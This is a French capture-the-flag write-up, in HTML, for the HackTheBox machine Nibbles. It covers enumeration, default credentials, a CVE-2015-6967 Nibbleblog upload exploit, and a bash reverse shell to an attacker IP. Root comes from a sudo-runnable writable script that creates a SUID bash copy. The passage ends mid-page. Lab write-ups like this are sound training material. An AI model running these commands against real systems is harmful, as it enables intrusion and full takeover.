@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Nibbles - z3rodol</title><meta name="Description" content="This is my cool site"><meta property="og:url" content="http://localhost:1313/nibbles/">
+  <meta property="og:site_name" content="z3rodol">
+  <meta property="og:title" content="Nibbles">
+  <meta property="og:description" content="Nibbles est l’une des machines les plus faciles à exploiter sur HTB. Elle héberge une instance vulnérable de Nibbleblog. Il existe une faille exploitable avec Metasploit, mais il est également possible de l’exploiter sans MSF ; je vais donc vous montrer la méthode avec un POC GitHub. L’élévation de privilèges consiste à utiliser abusivement la commande sudo sur un fichier accessible en écriture à tous.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:modified_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:tag" content="Easy">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Active Directory">
+    <meta property="article:tag" content="CVE-2015-6967">
+    <meta property="article:tag" content="Nibbleblog">
+    <meta property="og:image" content="http://localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/logo.png">
+  <meta name="twitter:title" content="Nibbles">
+  <meta name="twitter:description" content="Nibbles est l’une des machines les plus faciles à exploiter sur HTB. Elle héberge une instance vulnérable de Nibbleblog. Il existe une faille exploitable avec Metasploit, mais il est également possible de l’exploiter sans MSF ; je vais donc vous montrer la méthode avec un POC GitHub. L’élévation de privilèges consiste à utiliser abusivement la commande sudo sur un fichier accessible en écriture à tous.">
+<meta name="application-name" content="z3rodol">
+<meta name="apple-mobile-web-app-title" content="z3rodol">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/nibbles/" /><link rel="prev" href="http://localhost:1313/outbound/" /><link rel="next" href="http://localhost:1313/meta/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Nibbles",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/nibbles\/"
+        },"genre": "posts","keywords": "Easy, Windows, Active Directory, CVE-2015-6967, Nibbleblog","wordcount":  758 ,
+        "url": "http:\/\/localhost:1313\/nibbles\/","datePublished": "2025-12-11T10:28:41+00:00","dateModified": "2025-12-11T10:28:41+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "z3rodol"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="z3rodol">z3rodol Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="z3rodol">z3rodol Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Nibbles</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://z3rodol.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>z3rodol</a></span>&nbsp;<span class="post-category">included in <a href="/categories/machines/"><i class="far fa-folder" aria-hidden="true"></i>Machines</a>&nbsp;<a href="/categories/hackthebox/"><i class="far fa-folder" aria-hidden="true"></i>Hackthebox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2025-12-11">2025-12-11</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;758 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#énumération">Énumération</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#http---tcp-80">HTTP - TCP 80</a></li>
+      </ul>
+    </li>
+    <li><a href="#accès-initial">Accès initial</a>
+      <ul>
+        <li><a href="#cve-2015-6967">CVE-2015-6967</a></li>
+      </ul>
+    </li>
+    <li><a href="#escalade-de-privilèges">Escalade de privilèges</a>
+      <ul>
+        <li><a href="#énumération-1">Énumération</a></li>
+        <li><a href="#shell-en-tant-que-root">Shell en tant que root</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Nibbles/nibbles.png"
+        data-srcset="/images/Nibbles/nibbles.png, /images/Nibbles/nibbles.png 1.5x, /images/Nibbles/nibbles.png 2x"
+        data-sizes="auto"
+        alt="/images/Nibbles/nibbles.png"
+        title="Nibbles" width="632" height="297" /></p>
+<p><code>Nibbles</code> est l&rsquo;une des machines les plus faciles à exploiter sur HTB. Elle héberge une instance vulnérable de <strong>Nibbleblog</strong>. Il existe une faille exploitable avec <code>Metasploit</code>, mais il est également possible de l&rsquo;exploiter sans MSF ; je vais donc vous montrer la méthode avec un POC GitHub. L&rsquo;élévation de privilèges consiste à utiliser abusivement la commande <code>sudo</code> sur un fichier accessible en écriture à tous.</p>
+<h1 id="énumération">Énumération</h1>
+<h2 id="nmap">Nmap</h2>
+<p>Je lance un scan complet sur la machine.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">rustscan -a 10.129.96.84 -u <span class="m">5000</span> -- -sV -sC -oN fulltcpscan.txt</span></span></code></pre></div></div>
+<p>Je trouve alors deux ports ouverts :</p>
+<ul>
+<li>22 pour le service SSH qui semble tourné sur une machine Ubuntu</li>
+<li>80 pour le service HTTP qui semble avoir démarrer le service Apache</li>
+</ul>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">PORT   STATE SERVICE REASON         VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> c4f8ade8f80477decf150d630a187e49 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 228fb197bf0f1708fc7e2c8fe9773a48 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> e6ac27a3b5a9f1123c34a55d5beb3de9 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
+</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl <span class="m">63</span> Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: OPTIONS GET HEAD POST
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel</span></span></code></pre></div></div>
+<h2 id="http---tcp-80">HTTP - TCP 80</h2>
+<p>Le site est statique avec comme contenu une balise <code>h2</code> Hello world!.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Nibbles/Nibbles-1.png"
+        data-srcset="/images/Nibbles/Nibbles-1.png, /images/Nibbles/Nibbles-1.png 1.5x, /images/Nibbles/Nibbles-1.png 2x"
+        data-sizes="auto"
+        alt="/images/Nibbles/Nibbles-1.png"
+        title="/images/Nibbles/Nibbles-1.png" width="508" height="132" /></p>
+<p>Le code source me donne un repertoire <code>/nibbleblog/</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Nibbles/Nibbles-2.png"
+        data-srcset="/images/Nibbles/Nibbles-2.png, /images/Nibbles/Nibbles-2.png 1.5x, /images/Nibbles/Nibbles-2.png 2x"
+        data-sizes="auto"
+        alt="/images/Nibbles/Nibbles-2.png"
+        title="/images/Nibbles/Nibbles-2.png" width="562" height="297" /></p>
+<p>En m&rsquo;y rendant, je vois alors qu&rsquo;il s&rsquo;agit d&rsquo;un blog alimenté par le CMS <a href="https://github.com/dignajar/nibbleblog" target="_blank" rel="noopener noreffer ">Nibbleblog</a>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Nibbles/Nibbles-3.png"
+        data-srcset="/images/Nibbles/Nibbles-3.png, /images/Nibbles/Nibbles-3.png 1.5x, /images/Nibbles/Nibbles-3.png 2x"
+        data-sizes="auto"
+        alt="/images/Nibbles/Nibbles-3.png"
+        title="/images/Nibbles/Nibbles-3.png" width="1050" height="618" /></p>
+<p>Il n&rsquo;y a pas grand chose d&rsquo;intéressant sur cette page, donc je décide d&rsquo;énumérer les répertoires avec <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener noreffer ">dirsearch</a>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">dirsearch -u http://10.129.96.84/nibbleblog/</span></span></code></pre></div></div>
+<p>Je trouve plusieurs repertoires intéressants.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[15:20:13] 301 -   323B - /nibbleblog/admin  -&gt;  http://10.129.96.84/nibbleblog/admin/
+</span></span><span class="line"><span class="cl">[15:20:13] 200 -    1KB - /nibbleblog/admin.php
+</span></span><span class="line"><span class="cl">[15:20:13] 200 -    2KB - /nibbleblog/admin/
+</span></span><span class="line"><span class="cl">[15:20:13] 403 -   313B - /nibbleblog/admin/.htaccess
+</span></span><span class="line"><span class="cl">[15:20:14] 301 -   334B - /nibbleblog/admin/js/tinymce  -&gt;  http://10.129.96.84/nibbleblog/admin/js/tinymce/
+</span></span><span class="line"><span class="cl">[15:20:14] 200 -    2KB - /nibbleblog/admin/js/tinymce/
+</span></span><span class="line"><span class="cl">[15:20:19] 301 -   325B - /nibbleblog/content  -&gt;  http://10.129.96.84/nibbleblog/content/
+</span></span><span class="line"><span class="cl">[15:20:19] 200 -    1KB - /nibbleblog/content/
+</span></span><span class="line"><span class="cl">[15:20:19] 200 -    1KB - /nibbleblog/COPYRIGHT.txt
+</span></span><span class="line"><span class="cl">[15:20:22] 200 -    3KB - /nibbleblog/index.php
+</span></span><span class="line"><span class="cl">[15:20:22] 200 -    3KB - /nibbleblog/index.php/login/
+</span></span><span class="line"><span class="cl">[15:20:22] 200 -    78B - /nibbleblog/install.php
+</span></span><span class="line"><span class="cl">[15:20:22] 200 -    78B - /nibbleblog/install.php?profile=default
+</span></span><span class="line"><span class="cl">[15:20:22] 301 -   327B - /nibbleblog/languages  -&gt;  http://10.129.96.84/nibbleblog/languages/
+</span></span><span class="line"><span class="cl">[15:20:23] 200 -   34KB - /nibbleblog/LICENSE.txt
+</span></span><span class="line"><span class="cl">[15:20:26] 301 -   325B - /nibbleblog/plugins  -&gt;  http://10.129.96.84/nibbleblog/plugins/
+</span></span><span class="line"><span class="cl">[15:20:26] 200 -    4KB - /nibbleblog/plugins/
+</span></span><span class="line"><span class="cl">[15:20:26] 200 -    5KB - /nibbleblog/README
+</span></span><span class="line"><span class="cl">[15:20:29] 301 -   324B - /nibbleblog/themes  -&gt;  http://10.129.96.84/nibbleblog/themes/
+</span></span><span class="line"><span class="cl">[15:20:29] 200 -    2KB - /nibbleblog/themes/
+</span></span><span class="line"><span class="cl">[15:20:29] 200 -    2KB - /nibbleblog/update.php</span></span></code></pre></div></div>
+<p>La page <code>http://10.129.96.84/nibbleblog/admin</code> contient d&rsquo;autres répertoires.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Nibbles/Nibbles-4.png"
+        data-srcset="/images/Nibbles/Nibbles-4.png, /images/Nibbles/Nibbles-4.png 1.5x, /images/Nibbles/Nibbles-4.png 2x"
+        data-sizes="auto"
+        alt="/images/Nibbles/Nibbles-4.png"
+        title="/images/Nibbles/Nibbles-4.png" width="546" height="382" /></p>
+<p>La page <code>http://10.129.96.84/nibbleblog/admin.php</code> est une page de connexion.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Nibbles/Nibbles-5.png"
+        data-srcset="/images/Nibbles/Nibbles-5.png, /images/Nibbles/Nibbles-5.png 1.5x, /images/Nibbles/Nibbles-5.png 2x"
+        data-sizes="auto"
+        alt="/images/Nibbles/Nibbles-5.png"
+        title="/images/Nibbles/Nibbles-5.png" width="608" height="386" /></p>
+<p>Sur la page <code>http://10.129.96.84/nibbleblog/README</code>, je vois que la version de Nibbleblog utilisée est la <code>4.0.3</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Nibbles/Nibbles-6.png"
+        data-srcset="/images/Nibbles/Nibbles-6.png, /images/Nibbles/Nibbles-6.png 1.5x, /images/Nibbles/Nibbles-6.png 2x"
+        data-sizes="auto"
+        alt="/images/Nibbles/Nibbles-6.png"
+        title="/images/Nibbles/Nibbles-6.png" width="376" height="158" /></p>
+<p>Sur <a href="https://www.cve.org/CVERecord?id=CVE-2015-6967" target="_blank" rel="noopener noreffer ">cve.org</a>, je vois que cette version est vulnérable à une RCE grâce à de l&rsquo;upload de fichier. Je trouve même un <a href="https://github.com/hadrian3689/nibbleblog_4.0.3" target="_blank" rel="noopener noreffer ">POC</a>. Sauf qu&rsquo;il faut que m&rsquo;authentifie avec des droits administrateurs. Je dois donc trouver les identifiants valides.</p>
+<p>La page <code>http://10.129.96.84/nibbleblog/content/</code> contient 3 répertoires.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Nibbles/Nibbles-7.png"
+        data-srcset="/images/Nibbles/Nibbles-7.png, /images/Nibbles/Nibbles-7.png 1.5x, /images/Nibbles/Nibbles-7.png 2x"
+        data-sizes="auto"
+        alt="/images/Nibbles/Nibbles-7.png"
+        title="/images/Nibbles/Nibbles-7.png" width="587" height="273" /></p>
+<p>La page <code>http://10.129.96.84/nibbleblog/content/private</code> contient beaucoup de fichiers intéressants.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Nibbles/Nibbles-8.png"
+        data-srcset="/images/Nibbles/Nibbles-8.png, /images/Nibbles/Nibbles-8.png 1.5x, /images/Nibbles/Nibbles-8.png 2x"
+        data-sizes="auto"
+        alt="/images/Nibbles/Nibbles-8.png"
+        title="/images/Nibbles/Nibbles-8.png" width="702" height="496" /></p>
+<p>Le fichier <code>users.xml</code> contient la liste des utilisateurs ainsi que la liste des adresses IP black listées. Il n&rsquo;y a que l&rsquo;utilisateur <code>admin</code>. Ayant essayé quelques tentatives de connexion, je vois que mon adresse IP est black listée. Mais ce ne sera pas grave pour la suite des événements.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Nibbles/Nibbles-9.png"
+        data-srcset="/images/Nibbles/Nibbles-9.png, /images/Nibbles/Nibbles-9.png 1.5x, /images/Nibbles/Nibbles-9.png 2x"
+        data-sizes="auto"
+        alt="/images/Nibbles/Nibbles-9.png"
+        title="/images/Nibbles/Nibbles-9.png" width="597" height="363" /></p>
+<p>Il se trouve que les identifiants du blog soient <code>admin:nibbles</code>, après plusieurs combinaisons d&rsquo;identifiants par défaut.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Nibbles/Nibbles-10.png"
+        data-srcset="/images/Nibbles/Nibbles-10.png, /images/Nibbles/Nibbles-10.png 1.5x, /images/Nibbles/Nibbles-10.png 2x"
+        data-sizes="auto"
+        alt="/images/Nibbles/Nibbles-10.png"
+        title="/images/Nibbles/Nibbles-10.png" width="1180" height="650" /></p>
+<h1 id="accès-initial">Accès initial</h1>
+<h2 id="cve-2015-6967">CVE-2015-6967</h2>
+<p>J&rsquo;utilise alors le <a href="https://github.com/hadrian3689/nibbleblog_4.0.3" target="_blank" rel="noopener noreffer ">POC</a> trouvé précédemment pour obtenir un shell.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 nibbleblog_4.0.3.py -t http://10.129.96.84/nibbleblog/admin.php -u admin -p nibbles -shell</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Nibbles/Nibbles-11.png"
+        data-srcset="/images/Nibbles/Nibbles-11.png, /images/Nibbles/Nibbles-11.png 1.5x, /images/Nibbles/Nibbles-11.png 2x"
+        data-sizes="auto"
+        alt="/images/Nibbles/Nibbles-11.png"
+        title="/images/Nibbles/Nibbles-11.png" width="1222" height="316" /></p>
+<p>Ce shell n&rsquo;est pas très fonctionnel. Donc avec <a href="https://github.com/brightio/penelope" target="_blank" rel="noopener noreffer ">penelope</a>, j&rsquo;obtiens un shell plus stable.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Sur le shell instable
+</span></span><span class="line"><span class="cl">bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.48/9001 0&gt;&amp;1&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># Sur la machine attaquante
+</span></span><span class="line"><span class="cl">penelope -p 9001</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Nibbles/Nibbles-12.png"
+        data-srcset="/images/Nibbles/Nibbles-12.png, /images/Nibbles/Nibbles-12.png 1.5x, /images/Nibbles/Nibbles-12.png 2x"
+        data-sizes="auto"
+        alt="/images/Nibbles/Nibbles-12.png"
+        title="/images/Nibbles/Nibbles-12.png" width="1332" height="751" /></p>
+<p>Le répertoire personnel de <code>nibbler</code> contient le flag ainsi qu&rsquo; une archive zip.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Nibbles/Nibbles-13.png"
+        data-srcset="/images/Nibbles/Nibbles-13.png, /images/Nibbles/Nibbles-13.png 1.5x, /images/Nibbles/Nibbles-13.png 2x"
+        data-sizes="auto"
+        alt="/images/Nibbles/Nibbles-13.png"
+        title="/images/Nibbles/Nibbles-13.png" width="783" height="337" /></p>
+<h1 id="escalade-de-privilèges">Escalade de privilèges</h1>
+<h2 id="énumération-1">Énumération</h2>
+<p>Cette archive ne contient qu&rsquo;un seul fichier.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Nibbles/Nibbles-14.png"
+        data-srcset="/images/Nibbles/Nibbles-14.png, /images/Nibbles/Nibbles-14.png 1.5x, /images/Nibbles/Nibbles-14.png 2x"
+        data-sizes="auto"
+        alt="/images/Nibbles/Nibbles-14.png"
+        title="/images/Nibbles/Nibbles-14.png" width="623" height="221" /></p>
+<p>Notre utilisateur <code>nibbler</code> possède tous les droits sur ce fichier.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Nibbles/Nibbles-15.png"
+        data-srcset="/images/Nibbles/Nibbles-15.png, /images/Nibbles/Nibbles-15.png 1.5x, /images/Nibbles/Nibbles-15.png 2x"
+        data-sizes="auto"
+        alt="/images/Nibbles/Nibbles-15.png"
+        title="/images/Nibbles/Nibbles-15.png" width="761" height="150" /></p>
+<p>À ce stade le contenu du script ne m&rsquo;intéresse pas vraiment vu que je ne l&rsquo;utiliserai pas.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Nibbles/Nibbles-19.png"
+        data-srcset="/images/Nibbles/Nibbles-19.png, /images/Nibbles/Nibbles-19.png 1.5x, /images/Nibbles/Nibbles-19.png 2x"
+        data-sizes="auto"
+        alt="/images/Nibbles/Nibbles-19.png"
+        title="/images/Nibbles/Nibbles-19.png" width="1433" height="767" /></p>
+<p>Avec la commande <code>sudo -l</code>, je vois que <code>nibbler</code> peut exécuter ce script en tant que root sans fournir de mot de passe.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Nibbles/Nibbles-16.png"
+        data-srcset="/images/Nibbles/Nibbles-16.png, /images/Nibbles/Nibbles-16.png 1.5x, /images/Nibbles/Nibbles-16.png 2x"
+        data-sizes="auto"
+        alt="/images/Nibbles/Nibbles-16.png"
+        title="/images/Nibbles/Nibbles-16.png" width="1425" height="217" /></p>
+<h2 id="shell-en-tant-que-root">Shell en tant que root</h2>
+<p>Je modifie alors le contenu du script. Je fais une copie du <code>/bin/bash</code> et je lui donne les droits SUID. Cette copie aura les droits de l&rsquo;utilisateur root.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl">cp /bin/bash /tmp/rootme
+</span></span><span class="line"><span class="cl">chmod <span class="m">4777</span> /tmp/rootme</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Nibbles/Nibbles-17.png"
